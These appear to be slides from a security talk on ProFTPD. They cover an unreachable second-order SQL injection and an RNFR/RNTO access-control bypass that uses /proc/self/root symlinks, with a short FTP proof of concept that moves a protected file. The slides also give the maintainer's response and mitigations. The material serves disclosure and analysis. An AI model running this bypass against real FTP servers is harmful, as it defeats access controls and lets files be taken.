Logging in touches SQL. The username lookup is escaped.

ProFTPD can authenticate against SQL. On USER, and again on PASS, it looks the account up. The client-controlled name goes through the backend escaper first.

/* contrib/mod_sql.c — sql_getpasswd(), on USER and again on PASS */
realname = p->pw_name;                       /* the name the client sent */
mr = sql_dispatch(sql_make_cmd(cmd->tmp_pool, 2,
       MOD_SQL_DEF_CONN_NAME, realname), "sql_escapestring");
username = mr->data;      /* escaped: sqlite3_mprintf("%q") / real_escape_string */
usrwhere = pstrcat(cmd->tmp_pool, cmap.usrfield, "='", username, "'", NULL);

where = sql_prepare_where(SQL_PREPARE_WHERE_FL_NO_TAGS, cmd, 2, usrwhere, ...);
mr = sql_dispatch(sql_make_cmd(cmd->tmp_pool, 5, MOD_SQL_DEF_CONN_NAME,
       cmap.usrtable, cmap.usrfields, where, "1"), "sql_select");

Looks like injection. It is not.

Warm-up

Resolving your group runs a second query. That one is injectable.

/* sql_getgroup(): login resolves your primary GID -> group name */
groupname = sd->data[0];      /* query 1 result: a name, straight from the DB */

/* "The groupname has been escaped ... at this point."   <- it has not */
grpwhere = pstrcat(cmd->tmp_pool, cmap.grpfield, " = '", groupname, "'", NULL);
  • Query 2 embeds a DB-sourced name with no escaping. The comment right above it claims the value was escaped. (It was not.)
  • On Linux, your primary group is named after you (bob has group bob). So the injected value is, effectively, your username.

however

Second-order. The payload must already exist as a real account or group name. You do not get to pick ' OR 1=1-- as a Linux name. Identities are provisioned by the admin, not chosen at login.

A real SQL injection you cannot reach, sometimes a bug is just a bug.

Context · the FTP protocol

FTP, briefly

  • RFC 959, 1985. One of the oldest application protocols still in heavy production use.
  • Two channels: a control connection (port 21) carries commands/responses; a separate data connection moves bytes.
  • Stateful & line-based: USER → PASS → CWD → RETR/STOR/RNFR+RNTO …
  • Cleartext by design. TLS (FTPS) and SSH (SFTP) were bolted on much later.

A rename is two commands

> RNFR oldname   # rename-FROM
< 350 ready for destination
> RNTO newname   # rename-TO
< 250 Rename successful

RNFR selects the source file. (Remember this)

Context · the target

ProFTPD

  • First released ~1998. Lead author TJ Saunders
  • GPLv2-or-later, written in C, ~350k LOC. Highly modular: core FTP + SFTP, TLS, SQL, LDAP, RADIUS.
  • Config syntax deliberately modeled on Apache httpd…

…which is why it has this

<Directory /var/www>
  <Limit WRITE>
    DenyAll
  </Limit>
</Directory>

Apache-style per-path, per-command access control. That block is what our bug walks straight through.

The access-control model

How <Directory> / <Limit> works

ProFTPD matches the path a command targets against configured <Directory> blocks, then applies the <Limit> rules (AllowAll/DenyAll/by-user/by-group) for that command.

A file operation goes through one function:

dir_check(pool, cmd, group, path, ...)
  // returns 0 -> command denied on this path

Critical subtlety

<Limit> is an application policy layer layered on top of Unix permissions.

The RNFR handler

MODRET core_rnfr(cmd_rec *cmd) {
  path = pr_fs_decode_path2(cmd->tmp_pool, cmd->arg, ...);  /* client-controlled */
  pr_filter_allow_path(CURRENT_CONF, path);   /* PathAllow/DenyFilter */

  /* Allow renaming a symlink, even a dangling one. */
  path = dir_canonical_path(cmd->tmp_pool, path);       // (1) canonicalize

  if (path == NULL ||
      !dir_check(cmd->tmp_pool, cmd, cmd->group, path, NULL) ||  // (2) authorize
      !exists2(cmd->tmp_pool, path)) {          // (3) must exist
    pr_response_add_err(R_550, ...);          /* denied / not found */
  }
}

modules/mod_core.c · core_rnfr() · note the comment on the line above (1) — we'll come back to it

The entire bug

dir_check vs dir_check_canon

dir_canonical_path() is lexical: it collapses . and .. but never calls readlink(). So symlinks survive into the check. Now the two authorizers:

/* what core_rnfr calls: matches the path STRING as-is */
dir_check(pp, cmd, group, path, hidden);

/* what RNTO, DELE, MKD call: resolves symlinks FIRST */
int dir_check_canon(pp, cmd, group, path, hidden) {
  return dir_check(pp, cmd, group, dir_best_path(pp, path), hidden);
}                                 // dir_best_path -> realpath(): follows symlinks
dir_check_canon (correct)
realpath() → /etc/passwd → matches <Directory /etc> → DENIED ✓
dir_check (used by RNFR)
matches literal /proc/self/root/etc/passwd vs /etc → no match → ALLOWED ✗
The primitive

/proc/self/root (procfs goodness)

Linux hands every process a magic symlink at /proc/self/root that always points at that process's root directory. / for a ProFTPD child that isn't chrooted.

# to a string comparator (dir_check):
/proc/self/root/etc/passwd  ≠  /etc/passwd

# to the kernel, at rename() time:
/proc/self/root/etc/passwd  →  /etc/passwd

Why it's the perfect vector

  • Always present on Linux
  • No write access needed anywhere.
  • We use this, but works with any symlink.

Proof of concept · 3 commands

Built from this tree. Run as a normal user.

Config: a user, no DefaultRoot, and <Directory .../protected> <Limit ALL> DenyAll. Then one session:

[1] baseline — the real path is denied
  > RNFR /srv/protected/secret.txt
  < 550 Operation not permitted            # ACL enforced ✓

[2] bypass — same file, one prefix
  > RNFR /proc/self/root/srv/protected/secret.txt
  < 350 File or directory exists, ready ...  # ACL BYPASSED ✗
  > RNTO /home/attacker/stolen.txt
  < 250 Rename successful                    # protected file relocated

The verdict

"It's not a bug, it's a feature"

Renaming of symlinks is still a desirable behavior, and I don't want to necessarily break that.
I don't think this behavior is severe enough to warrant code changes.
— TJ Saunders (maintainer), 2026-06-17

Mitigation: DefaultRoot (chroot, procfs disappears) or PathDenyFilter ^/proc/. Works with any symlink, so it doesn't really address the problem.
